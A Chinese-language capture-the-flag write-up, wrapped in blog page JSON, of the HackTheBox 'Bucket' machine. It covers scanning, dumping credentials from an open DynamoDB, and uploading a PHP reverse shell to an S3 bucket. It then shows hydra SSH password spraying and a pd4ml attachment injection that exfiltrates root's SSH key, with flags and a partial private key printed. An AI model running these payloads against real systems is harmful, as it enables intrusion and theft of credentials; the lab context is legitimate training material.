{"pageProps":{"postData":{"id":"HackTheBoxMachine - Bucket","contentHtml":"<h1>Machine - Bucket</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Bucket\">https://app.hackthebox.com/machines/Bucket</a> | <code>Linux</code> | <code>Medium</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket nmap -sT -min-rate 5000 10.10.10.212\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:27 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> bucket.htb (10.10.10.212)\nHost is up (0.086s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 0.51 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Bucket nmap -sT -A -p 22,80 10.10.10.212                             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:28 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> bucket.htb (10.10.10.212)\nHost is up (0.12s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:<span class=\"hljs-built_in\">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html).\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   108.02 ms 10.10.16.1\n2   54.68 ms  bucket.htb (10.10.10.212)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.14 seconds\n</span></code></pre>\n<p>访问 <code>HTTP</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image1.png\" alt=\"image.png\"></p>\n<p>主页上没有一点信息，对目录进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket feroxbuster --url http://bucket.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,403 -x php,zip,txt \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://bucket.htb/\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 403]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ <span class=\"hljs-literal\">true</span>\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n[#>------------------] - 88s    46359/882180  23m     found:0       errors:37     \n🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_bucket_htb_-1749173567.state ...\n[#>------------------] - 88s    46399/882180  23m     found:0       errors:37     \n[#>------------------] - 88s    46400/882180  527/s   http://bucket.htb/         \n</code></pre>\n<p>但是我注意到源代码中的图片是通过子域名<code>http://s3.bucket.htb</code> 中获取的</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image2.png\" alt=\"image.png\"></p>\n<p>将其添加到 <code>hosts</code>，并访问，只显示 <code>running</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image3.png\" alt=\"image.png\"></p>\n<p>网上搜索 <code>s3</code> 大部分都是 <code>AWS S3</code> ，所以假定这是一个 <code>AWS S3</code> 实例</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image4.png\" alt=\"image.png\"></p>\n<p>跑一下目录扫描，能找到两个子目录</p>\n<pre><code class=\"hljs language-bash\">➜Bucket gobuster <span class=\"hljs-built_in\">dir</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://s3.bucket.htb\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://s3.bucket.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/health               (Status: 200) [Size: 54]\n/shell                (Status: 200) [Size: 0]\n/server-status        (Status: 403)\n</code></pre>\n<h2>AWS S3</h2>\n<blockquote>\n<p>关于AWS S3 <a href=\"https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html\">https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html</a></p>\n</blockquote>\n<p>根据手册，<code>adserver</code>是一个存储桶，<code>images/bug.jpg</code> 是对象键，<code>http://s3.bucket.htb</code> 是端点</p>\n<p>访问 <code>/shell</code> 会被重定向到一个奇怪的<code>URL</code>，看起来只像是只有内网可以访问</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image5.png\" alt=\"image.png\"></p>\n<p>访问 <code>/health</code> 发现除了 s3 还运行着 <code>dynamodb</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image6.png\" alt=\"image.png\"></p>\n<blockquote>\n<p>关于 Dynamodb <a href=\"https://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html\">https://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html</a></p>\n</blockquote>\n<p>从文档上看，Dynamodb 和 S3 都可以使用 Amazon CLI 来访问，并且两个应用都是可以集成的</p>\n<h3>Dynamodb</h3>\n<p>访问<code>Dynamodb</code>前，要先配置  <code>aws-cli</code></p>\n<p>PS：官方配置需要 Access ID，并且注册需要信用卡，以为差点无了，看了下WP才知道可以瞎填</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket aws configure           \nAWS Access Key ID [None]: sunsetaction\nAWS Secret Access Key [None]: sunsetaction\nDefault region name [None]: CN\nDefault output format [None]: json\n</code></pre>\n<p>列出所有表</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket aws dynamodb list-tables --endpoint-url http://s3.bucket.htb\n{\n    <span class=\"hljs-string\">\"TableNames\"</span>: [\n        <span class=\"hljs-string\">\"users\"</span>\n    ]\n}\n</code></pre>\n<p>查询表的数据，可以得到几个用户凭据</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket aws dynamodb scan --endpoint-url http://s3.bucket.htb --table-name <span class=\"hljs-built_in\">users</span>\n{\n    <span class=\"hljs-string\">\"Items\"</span>: [\n        {\n            <span class=\"hljs-string\">\"password\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Management@#1@#\"</span>\n            },\n            <span class=\"hljs-string\">\"username\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Mgmt\"</span>\n            }\n        },\n        {\n            <span class=\"hljs-string\">\"password\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Welcome123!\"</span>\n            },\n            <span class=\"hljs-string\">\"username\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Cloudadm\"</span>\n            }\n        },\n        {\n            <span class=\"hljs-string\">\"password\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"n2vM-&#x3C;_K_Q:.Aa2\"</span>\n            },\n            <span class=\"hljs-string\">\"username\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Sysadm\"</span>\n            }\n        }\n    ],\n    <span class=\"hljs-string\">\"Count\"</span>: 3,\n    <span class=\"hljs-string\">\"ScannedCount\"</span>: 3,\n    <span class=\"hljs-string\">\"ConsumedCapacity\"</span>: null\n}\n</code></pre>\n<p>将其拿去对<code>ssh</code>进行碰撞，但是无结果，貌似也能对数据进行写入，但是现在也没用</p>\n<h3>文件上传</h3>\n<p>我们通过文档 <a href=\"https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html\">https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html</a> 可以知道存在 <code>aws s3 ls</code> 命令，该命令作用是将在单个非分页调用中列出您账户中的所有通用存储桶。</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 <span class=\"hljs-built_in\">ls</span>\n2025-06-06 15:06:03 adserver\n</code></pre>\n<p>命令结果是我们和<code>images</code> 在同一目录下</p>\n<p>我们查看帮助还能看到 <code>cp</code> 命令，那么代表可能可以对文件进行上传</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image7.png\" alt=\"image.png\"></p>\n<p>我们上传一个文件测试一下</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'&#x3C;?php phpinfo();?>'</span> > test.php                                                                                                                         \n\n➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 <span class=\"hljs-built_in\">cp</span> test.php s3://adserver/test.php\nupload: ./test.php to s3://adserver/test.php \n</code></pre>\n<p>可以上传，但是貌似无法解析</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image8.png\" alt=\"image.png\"></p>\n<p>这里看了下<code>WP</code>，之前进行目录扫描<code>s3</code>的时候能扫描到<code>/server-status</code> ，那么该处和<code>bucket.htb</code>可能在同一目录下，而且可以支持解析 <code>php</code> 拓展名</p>\n<p>在 <code>adserver</code> 目录下没有</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image9.png\" alt=\"image.png\"></p>\n<p>这里通过 <code>ls</code> 命令来查看 <code>adserver</code>文件夹内的文件，可以看到存在<code>index.html</code> ，那么可能就是主站</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket aws --endpoint-url http://s3.bucket.htb s3 <span class=\"hljs-built_in\">ls</span> s3://adserver                    \n                           PRE images/\n2025-06-06 15:48:02       5344 index.html\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image10.png\" alt=\"image.png\"></p>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php <span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/10.10.16.69/1234 0>&#x26;1'\"</span>);?>\n</code></pre>\n<p>和之前一样的操作可以直接获得弹回来的 <code>shell</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image11.png\" alt=\"image.png\"></p>\n<h2>权限提升</h2>\n<h3>密码碰撞</h3>\n<p>发现存在用户<code>roy</code></p>\n<pre><code class=\"hljs language-bash\">www-data@bucket:/var/www$ <span class=\"hljs-built_in\">ls</span> /home\nroy\n</code></pre>\n<p>我们使用的到的密码进行碰撞</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket hydra -l roy  -P passwords.txt -t 12 10.10.10.212 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC &#x26; David Maciejak - Please <span class=\"hljs-keyword\">do</span> not use <span class=\"hljs-keyword\">in</span> military or secret service organizations, or <span class=\"hljs-keyword\">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 16:13:00\n[WARNING] Many SSH configurations <span class=\"hljs-built_in\">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task\n[DATA] attacking ssh://10.10.10.212:22/\n[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-&#x3C;_K_Q:.Aa2\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-06 16:13:06\n</code></pre>\n<p>成功得到 <code>Roy</code>的<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">➜  Bucket ssh roy@10.10.10.212   \nroy@10.10.10.212<span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri 06 Jun 2025 07:52:46 AM UTC\n\n  System load:                      0.05\n  Usage of /:                       33.9% of 17.59GB\n  Memory usage:                     30%\n  Swap usage:                       0%\n  Processes:                        256\n  Users logged in:                  2\n  IPv4 address for br-bee97070fb20: 172.18.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for ens160:          10.10.10.212\n  IPv6 address for ens160:          dead:beef::250:56ff:feb9:cb55\n\n229 updates can be installed immediately.\n103 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Fri Jun  6 06:08:21 2025 from 10.10.16.27\nroy@bucket:~$ \n</span></code></pre>\n<p>当前目录下能得到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">roy@bucket:~$ <span class=\"hljs-built_in\">cat</span> user.txt\n6e375b41aac41437da7b58d400a30c74\n</code></pre>\n<h3>信息收集</h3>\n<p><code>db.php</code></p>\n<pre><code class=\"hljs language-bash\">roy@bucket:~/project$ <span class=\"hljs-built_in\">cat</span> db.php\n&#x3C;?php\nrequire <span class=\"hljs-string\">'vendor/autoload.php'</span>;\ndate_default_timezone_set(<span class=\"hljs-string\">'America/New_York'</span>);\nuse Aws\\DynamoDb\\DynamoDbClient;\nuse Aws\\DynamoDb\\Exception\\DynamoDbException;\n\n<span class=\"hljs-variable\">$client</span> = new Aws\\Sdk([\n    <span class=\"hljs-string\">'profile'</span> => <span class=\"hljs-string\">'default'</span>,\n    <span class=\"hljs-string\">'region'</span>  => <span class=\"hljs-string\">'us-east-1'</span>,\n    <span class=\"hljs-string\">'version'</span> => <span class=\"hljs-string\">'latest'</span>,\n    <span class=\"hljs-string\">'endpoint'</span> => <span class=\"hljs-string\">'http://localhost:4566'</span>\n]);\n\n<span class=\"hljs-variable\">$dynamodb</span> = <span class=\"hljs-variable\">$client</span>->createDynamoDb();\n\n//todo\n</code></pre>\n<p>内部开放了好几个端口</p>\n<pre><code class=\"hljs language-bash\">roy@bucket:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process\nudp                    UNCONN                  0                       0                                        127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:42189                                          0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                     127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:4566                                           0.0.0.0:*\ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*\ntcp                    LISTEN                  0                       511                                          127.0.0.1:8000                                           0.0.0.0:*\ntcp                    LISTEN                  0                       511                                                  *:80                                                   *:*\ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*\n</code></pre>\n<p>我们将 <code>4566</code>和 <code>8000</code>端口转发出去</p>\n<pre><code class=\"hljs language-bash\">roy@bucket:~$ ./socat TCP-LISTEN:4567,fork tcp4:127.0.0.1:4566 &#x26;\n[1] 145731\nroy@bucket:~$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &#x26;\n[2] 145736\n</code></pre>\n<p>其中 <code>8000</code>端口是貌似未完工的</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image12.png\" alt=\"image.png\"></p>\n<p><code>4566</code>像是<code>s3</code>的端点</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image13.png\" alt=\"image.png\"></p>\n<p>尝试通过<code>aws</code>访问</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket aws --endpoint-url http://bucket.htb:4567 s3 <span class=\"hljs-built_in\">ls</span>\n2025-06-06 16:04:01 adserver\n</code></pre>\n<p>可能是一个内部端点，尝试读取数据库</p>\n<pre><code class=\"hljs language-bash\">➜  Bucket aws dynamodb list-tables --endpoint-url http://bucket.htb:4567\n{\n    <span class=\"hljs-string\">\"TableNames\"</span>: [\n        <span class=\"hljs-string\">\"Music\"</span>,\n        <span class=\"hljs-string\">\"users\"</span>\n    ]\n}\n</code></pre>\n<p><code>users</code>和我们在外部端点访问的一样，<code>Music</code>是空的（可能其他人使用官方文档中的语句创建的），感觉就是之前的外部端点</p>\n<h3>To root</h3>\n<p>回到<code>8000</code>端口，我们发现这是一个不小的项目，线路也可能在这里</p>\n<pre><code class=\"hljs language-bash\">roy@bucket:/var/www/bucket-app$ <span class=\"hljs-built_in\">ls</span>\ncomposer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor\n</code></pre>\n<pre><code class=\"hljs language-bash\">roy@bucket:/var/www$ getfacl bucket-app/\n<span class=\"hljs-comment\"># file: bucket-app/</span>\n<span class=\"hljs-comment\"># owner: root</span>\n<span class=\"hljs-comment\"># group: root</span>\nuser::rwx\nuser:roy:r-x\ngroup::r-x\nmask::r-x\nother::---\n</code></pre>\n<p><code>index.php</code></p>\n<pre><code class=\"hljs language-bash\">roy@bucket:/var/www/bucket-app$ <span class=\"hljs-built_in\">cat</span> index.php\n&#x3C;?php\nrequire <span class=\"hljs-string\">'vendor/autoload.php'</span>;\nuse Aws\\DynamoDb\\DynamoDbClient;\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">\"REQUEST_METHOD\"</span>]===<span class=\"hljs-string\">\"POST\"</span>) {\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">\"action\"</span>]===<span class=\"hljs-string\">\"get_alerts\"</span>) {\n                date_default_timezone_set(<span class=\"hljs-string\">'America/New_York'</span>);\n                <span class=\"hljs-variable\">$client</span> = new DynamoDbClient([\n                        <span class=\"hljs-string\">'profile'</span> => <span class=\"hljs-string\">'default'</span>,\n                        <span class=\"hljs-string\">'region'</span>  => <span class=\"hljs-string\">'us-east-1'</span>,\n                        <span class=\"hljs-string\">'version'</span> => <span class=\"hljs-string\">'latest'</span>,\n                        <span class=\"hljs-string\">'endpoint'</span> => <span class=\"hljs-string\">'http://localhost:4566'</span>\n                ]);\n\n                <span class=\"hljs-variable\">$iterator</span> = <span class=\"hljs-variable\">$client</span>->getIterator(<span class=\"hljs-string\">'Scan'</span>, array(\n                        <span class=\"hljs-string\">'TableName'</span> => <span class=\"hljs-string\">'alerts'</span>,\n                        <span class=\"hljs-string\">'FilterExpression'</span> => <span class=\"hljs-string\">\"title = :title\"</span>,\n                        <span class=\"hljs-string\">'ExpressionAttributeValues'</span> => array(<span class=\"hljs-string\">\":title\"</span>=>array(<span class=\"hljs-string\">\"S\"</span>=><span class=\"hljs-string\">\"Ransomware\"</span>)),\n                ));\n\n                foreach (<span class=\"hljs-variable\">$iterator</span> as <span class=\"hljs-variable\">$item</span>) {\n                        <span class=\"hljs-variable\">$name</span>=rand(1,10000).<span class=\"hljs-string\">'.html'</span>;\n                        file_put_contents(<span class=\"hljs-string\">'files/'</span>.<span class=\"hljs-variable\">$name</span>,<span class=\"hljs-variable\">$item</span>[<span class=\"hljs-string\">\"data\"</span>]);\n                }\n                passthru(<span class=\"hljs-string\">\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/<span class=\"hljs-variable\">$name</span> 800 A4 -out files/result.pdf\"</span>);\n        }\n}\n<span class=\"hljs-keyword\">else</span>\n{\n?>\n</code></pre>\n<p>逻辑大概是通过<code>POST</code>方法访问，并且参数<code>action</code>等于<code>get_alerts</code> 时，对数据进行连接，然后循环<code>alerts</code>表并筛选表达式中 <code>:title</code> 占位符的值，这里为 \"<code>Ransomware</code>\"。再下面的循环上边筛选后的值，生成一个1到10000之间的随机数，并附加 <code>.html</code> 后缀，作为 HTML 文件名，并将筛选后的值的<code>data</code>写入<code>HTML</code> 文件。暗示了你的 DynamoDB <code>alerts</code> 表中的项目的 <code>data</code> 属性存储的是 HTML 内容。</p>\n<p>最后一行，调用了<code>pd4ml_demo.jar</code> ，提供用于 HTML 到 PDF 转换的基本 Java API，包括 PD4ML JSP 标签库。</p>\n<p>那么最后一句就是将生成<code>HTML</code>文件钻换成<code>PDF</code>文件，并存放在<code>files/result.pdf</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image14.png\" alt=\"image.png\"></p>\n<p>我们观察<code>files</code>文件夹没有任何文件产生，应该是表<code>alerts</code>不存在，我们首先创建<code>alerts</code>表</p>\n<pre><code class=\"hljs language-bash\">aws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url http://bucket.htb:4567\n</code></pre>\n<pre><code class=\"hljs language-bash\">aws dynamodb tables-list --endpoint-url http://bucket.htb:4567\n{\n    <span class=\"hljs-string\">\"TableNames\"</span>: [\n        <span class=\"hljs-string\">\"Music\"</span>,\n        <span class=\"hljs-string\">\"alerts\"</span>,\n        <span class=\"hljs-string\">\"users\"</span>\n    ]\n}\n</code></pre>\n<p>但是我们能发现一会后，<code>alerts</code>表就会被删除，所以我们要通过脚本来执行操作</p>\n<p>尝试包含文件，这里我们查看<code>pd4ml</code>的文档，其中有一项是添加附件：<a href=\"https://pd4ml.com/support-topics/usage-examples/#add-attachment\">https://pd4ml.com/support-topics/usage-examples/#add-attachment</a></p>\n<pre><code class=\"hljs language-bash\">&#x3C;html>&#x3C;pd4ml:attachment style=\\\"align: right\\\" <span class=\"hljs-built_in\">type</span>=\\\"paperclip\\\" src=\\\"/root/root.txt\\\"/>&#x3C;/html>\n</code></pre>\n<p>编写脚本</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'create table alerts\\n'</span>\naws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url http://bucket.htb:4567\n\n<span class=\"hljs-built_in\">sleep</span> 2;\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'create talbe success?\\n'</span>\naws dynamodb list-tables --endpoint-url http://bucket.htb:4567\n<span class=\"hljs-built_in\">sleep</span> 2;\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'Insert data:\\n'</span>\naws dynamodb put-item \\\n    --table-name alerts  \\\n    --item \\\n        <span class=\"hljs-string\">'{\"title\": {\"S\": \"Ransomware\"}, \"data\": {\"S\": \"&#x3C;pd4ml:attachment description=\\\"attached.txt\\\" icon=\\\"PushPin\\\">file:///root/.ssh/id_rsa&#x3C;/pd4ml:attachment>\"}}'</span> \\\n    --endpoint-url http://bucket.htb:4567\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'POST endpoint &#x26;&#x26; copy the file'</span>\ncurl http://bucket.htb:8001 -X POST -d <span class=\"hljs-string\">'action=get_alerts'</span>\n</code></pre>\n<p>查看 <code>result.pdf</code> ，能拿到私钥</p>\n<pre><code class=\"hljs language-bash\">-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU\n......\npHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/\nlt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1\nxMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n</code></pre>\n<p>通过私钥登录后，读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@bucket:~# <span class=\"hljs-built_in\">cat</span> root.txt \n880bb2407bd062f1f9896875e8d049bf\n</code></pre>\n<h2>总结</h2>\n<p>又一次感到自己是真的无耐心…一烦躁起来就无法思考。。这次碰到新东西，卡了还是蛮久的，不过利用都没什么挡住的地方，除了最后的读取文件。</p>\n<p>学习到了 <code>AWS S3</code>，以及一些<code>Dynamodb</code> 的知识</p>","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","updated":"2025-06-06","tags":["HackTheBox","Linux","AWS_S3","Dynamodb","PD4ML"],"categories":"靶机","comments":true,"description":"Machine - Bucket\n\n https://app.hackthebox.com/machines/Bucket | `Linux` | `Medium`\n \n\n\n\nRecon\n\n端口扫描\n\n\n\n\n\n访问 `HTTP`\n\n\n\n主页上没有一点信息，对目录进行爆破\n\n\n\n但是我注意到源代码中的图片是通过子域名`http://s3.bucket.htb` 中获取的\n\n\n\n将其添加到 `host..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"},{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"}]},"__N_SSG":true}